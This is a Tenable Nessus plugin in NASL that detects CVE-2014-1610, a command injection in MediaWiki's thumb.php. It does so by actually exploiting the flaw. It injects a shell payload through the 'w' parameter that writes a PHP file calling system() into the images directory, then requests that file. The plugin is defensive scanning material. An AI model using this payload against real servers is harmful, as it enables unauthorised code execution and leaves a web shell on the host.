#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(72618);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2015/09/24 21:17:12 $");

  script_cve_id("CVE-2014-1610");
  script_bugtraq_id(65223);
  script_osvdb_id(102630, 102631);
  script_xref(name:"EDB-ID", value:"31329");

  script_name(english:"MediaWiki thumb.php 'w' Parameter Remote Shell Command Injection");
  script_summary(english:"Attempts to execute arbitrary commands.");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains an application that is affected by a
remote command injection vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of MediaWiki running on the remote host is affected by a
remote command injection vulnerability due to a failure to properly
sanitize user-supplied input to the 'w' parameter in the 'thumb.php'
script. A remote, unauthenticated attacker can exploit this issue to
execute arbitrary commands and/or execute arbitrary code on the remote
host.

Note that the application is also affected by an additional command
injection issue. However, Nessus has not tested for this additional
issue.

Note also that PDF file upload support and the PdfHandler extension
must be enabled in order to exploit this issue."
);
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2014/Feb/6");
  # http://www.checkpoint.com/threatcloud-central/articles/2014-01-28-tc-researchers-discover.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?85eeffc8");
  script_set_attribute(attribute:"see_also", value:"https://www.mediawiki.org/wiki/Release_notes/1.19");
  script_set_attribute(attribute:"see_also", value:"https://www.mediawiki.org/wiki/Release_notes/1.21");
  script_set_attribute(attribute:"see_also", value:"https://www.mediawiki.org/wiki/Release_notes/1.22");
  # http://lists.wikimedia.org/pipermail/mediawiki-announce/2014-January/000140.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?51818bdc");
  script_set_attribute(attribute:"solution", value:
"Upgrade to MediaWiki 1.19.11 / 1.21.5 / 1.22.2 or later, and update
the PdfHandler extension to the latest available version.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"MediaWiki thumb.php page Parameter Remote Shell Command Injection");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'MediaWiki Thumb.php Remote Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/01/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/01/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/02/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mediawiki:mediawiki");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("mediawiki_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("installed_sw/MediaWiki", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");
include("url_func.inc");

app = "MediaWiki";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Variables
file = NULL;
url = "/images";

function pdf_chk(string)
{
  local_var item, file;
  item = eregmatch(pattern:'\\<a href="(.*\\.pdf)"', string:string);

  if (isnull(item)) return NULL;

  file = item[1];
  return file;
}

function d_listing(string)
{
  local_var matches, match, item, subdir, subdirs, pat;
  subdirs = make_list();
  pat = 'alt="\\[DIR\\]"\\>.*\\<a href="([^/].*/)"\\>';

  if (egrep(pattern:"\<title\>Index of (.*)", string:string))
  {
    matches = egrep(pattern:pat, string:string);
    if (matches)
    {
      foreach match (split(matches))
      {
        item = eregmatch(pattern:pat, string:match);
        if (!isnull(item))
        {
          subdir = item[1];
          if (subdir == "temp/") continue;   #Ignore temp directory
          subdirs = make_list(subdirs, subdir);
        }
      }
    }
  }
  return subdirs;
}

# Check /images for a directory listing and find an existing PDF
res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + url,
  exit_on_fail : TRUE,
  follow_redirect : 1
);

if (egrep(pattern:"\<title\>Index of (.*)/images\</title\>", string:res[2]))
{
  file = pdf_chk(string:res[2]);

  # Get a list of directories and traverse each to look for a PDF
  # Only go 3 levels deep
  if (isnull(file))
  {
    subdirs = d_listing(string:res[2]);
    foreach d1 (subdirs)
    {
      res = http_send_recv3(
        method : "GET",
        port   : port,
        item   : dir + url + "/" + d1,
        exit_on_fail : TRUE
      );
      if (!isnull(res[2]))
        file = pdf_chk(string:res[2]);
      if (!isnull(file)) break;

      subdirs2 = d_listing(string:res[2]);
      foreach d2 (subdirs2)
      {
        res = http_send_recv3(
          method : "GET",
          port   : port,
          item   : dir + url + "/" + d1 + d2,
          exit_on_fail : TRUE
        );
        if (!isnull(res[2]))
          file = pdf_chk(string:res[2]);
        if (!isnull(file)) break;

        subdirs3 = d_listing(string:res[2]);
        foreach d3 (subdirs3)
        {
          res = http_send_recv3(
            method : "GET",
            port   : port,
            item   : dir + url + "/" + d1 + d2 + d3,
            exit_on_fail : TRUE
          );
          if (!isnull(res[2]))
            file = pdf_chk(string:res[2]);
          if (!isnull(file)) break;
        }
        if (!isnull(file)) break;
      }
      if (!isnull(file)) break;
    }
  }
}

if (isnull(file))
  exit(0, "No PDF files were found in " + install_url + url);

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";

exp_file = SCRIPT_NAME - ".nasl" + "-" + unixtime();
r = 0;

foreach cmd (cmds)
{
  exp_file += r;
  if (cmd == "id")
    attack = '/thumb.php?f=' +file+ '&w=5|`echo "<?php system(id);' +
    'echo(\\"path=\\"); system(pwd);">images/' +exp_file+ '.php`';
  else
  {
    attack = '/thumb.php?f=' +file+ '&w=5|echo "<?php echo(' + "'<pre>');" +
    "system('ipconfig /all');system('dir " +exp_file+ ".php');" +
    '//">images/' +exp_file+ ".php";
  }

  attack = urlencode(
    str        : attack,
    unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234" +
                 "56789=+&|.?`;/()-_"
  );

  res = http_send_recv3(
    method : "GET",
    port   : port,
    item   : dir + attack,
    exit_on_fail : TRUE
  );

  if ("<h1>Error generating thumbnail</h1>" >< res[2])
  {
    res = http_send_recv3(
      method : "GET",
      port   : port,
      item   : dir + url + "/" + exp_file + ".php",
      exit_on_fail : TRUE
    );
    if (egrep(pattern:cmd_pats[cmd], string:res[2]))
    {
      if (cmd == "id")
      {
        pwd = strstr(res[2], "path");
        output = res[2] - pwd;
        path = chomp(pwd - "path=");
        break;
      }
      else
      {
        output = strstr(res[2], "Windows IP");
        item = eregmatch(pattern:"Directory of (.*)", string:res[2]);

        if (!isnull(item))
        {
          path = chomp(item[1]);
          pos = stridx(output, "Volume in drive");
          output = substr(output, 0, pos - 1);
          break;
        }
      }
      break;
    }
  }
  r++;
}

if (strlen(output) > 0)
{
  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    cmd         : cmd,
    request     : make_list(install_url + attack, install_url + url + "/" + exp_file + ".php"),
   output      : chomp(output),
   rep_extra   : 
     '\nNote: This file has not been removed by Nessus and will need to'+
     '\nbe manually deleted (' +path+ ').'
  ); 
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
